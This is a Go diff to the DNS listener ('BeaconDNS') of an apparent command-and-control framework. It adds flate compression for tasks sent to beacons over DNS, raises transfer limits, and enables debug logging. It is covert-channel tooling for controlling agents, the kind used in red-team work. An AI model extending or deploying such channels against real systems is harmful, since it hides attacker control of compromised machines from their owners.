@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"compress/flate"
 	"context"
 	"encoding/base32"
 	"encoding/binary"
@@ -20,7 +22,7 @@ import (
 // dnsDebug controls verbose logging for the DNS listener. It is disabled by
 // default so that release builds remain quiet. Set to true temporarily when
 // troubleshooting BeaconDNS behavior.
-const dnsDebug = false
+const dnsDebug = true
 
 type dnsFragBuf struct {
 	total  uint32
@@ -105,7 +107,7 @@ func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
 	offset := binary.BigEndian.Uint32(data[4:8])
 	chunk := data[8:]
 
-	const maxUploadSize = 1 << 20
+	const maxUploadSize = 4 << 20 // 4MB 上行限制，与 Beacon 端 ConnectorDNS 保持一致
 	if total == 0 || total > maxUploadSize {
 		_ = d.ts.TsAgentProcessData(sid, data)
 		return
@@ -117,9 +119,6 @@ func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
 	}
 
 	key := sid
-	if seq > 0 {
-		key = fmt.Sprintf("%s:%08x", sid, uint32(seq))
-	}
 
 	d.mu.Lock()
 	defer d.mu.Unlock()
@@ -290,6 +289,9 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 		case "GET":
+			if sid != "" {
+				_ = d.ts.TsAgentSetTick(sid)
+			}
 			// 下行：从 TS 中取数据，并按 [total_len][offset][chunk] 做应用层分片
 			var frame []byte
 			if sid != "" {
@@ -304,17 +306,46 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				// 如果没有缓存或已发送完，则从 TS 获取新的打包任务
 				if df == nil || df.off >= df.total {
 					maxDataSize := d.Config.PktSize * 256
-					if maxDataSize <= 0 || maxDataSize > 0x1900000 {
-						maxDataSize = 0x1900000
+					if maxDataSize <= 0 || maxDataSize > (4<<20) {
+						maxDataSize = 4 << 20
 					}
 					if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
 						if dnsDebug {
 							fmt.Printf("[BeaconDNS] GET tasks sid=%s total=%d\n", sid, len(p))
 						}
-						if sid != "" {
-							_ = d.ts.TsAgentSetTick(sid)
+						origLen := len(p)
+						// 尝试使用 flate 压缩原始任务数据，若压缩后更小则启用压缩路径。
+						var (
+							flags      byte
+							payloadBuf []byte
+						)
+						// 仅在数据量较大时尝试压缩，避免小数据反而放大
+						if origLen > 1024 {
+							var buf bytes.Buffer
+							w, err := flate.NewWriter(&buf, flate.BestSpeed)
+							if err == nil {
+								_, _ = w.Write(p)
+								_ = w.Close()
+								compressed := buf.Bytes()
+								if len(compressed) < origLen {
+									flags = 1 // 启用压缩标志
+									payloadBuf = compressed
+								}
+							}
 						}
-						df = &dnsDownBuf{total: uint32(len(p)), off: 0, buf: p}
+						if payloadBuf == nil {
+							// 不压缩或压缩无收益：直接发送原始数据
+							flags = 0
+							payloadBuf = p
+						}
+						buf := make([]byte, 5+len(payloadBuf))
+						buf[0] = flags
+						buf[1] = byte(origLen & 0xFF)
+						buf[2] = byte((origLen >> 8) & 0xFF)
+						buf[3] = byte((origLen >> 16) & 0xFF)
+						buf[4] = byte((origLen >> 24) & 0xFF)
+						copy(buf[5:], payloadBuf)
+						df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
 						d.mu.Lock()
 						d.downFrags[sid] = df
 						d.mu.Unlock()
@@ -338,6 +369,20 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 					binary.BigEndian.PutUint32(frame[0:4], df.total)
 					binary.BigEndian.PutUint32(frame[4:8], df.off)
 					copy(frame[8:], df.buf[df.off:df.off+chunkLen])
+
+					if dnsDebug {
+						firstEnd := 8 + 8
+						if firstEnd > len(frame) {
+							firstEnd = len(frame)
+						}
+						fmt.Printf("[BeaconDNS] GET frame sid=%s total=%d off=%d chunk=%d firstBytes=%x\n",
+							sid,
+							binary.BigEndian.Uint32(frame[0:4]),
+							binary.BigEndian.Uint32(frame[4:8]),
+							len(frame)-8,
+							frame[8:firstEnd],
+						)
+					}
 
 					df.off += chunkLen
 					if df.off >= df.total {
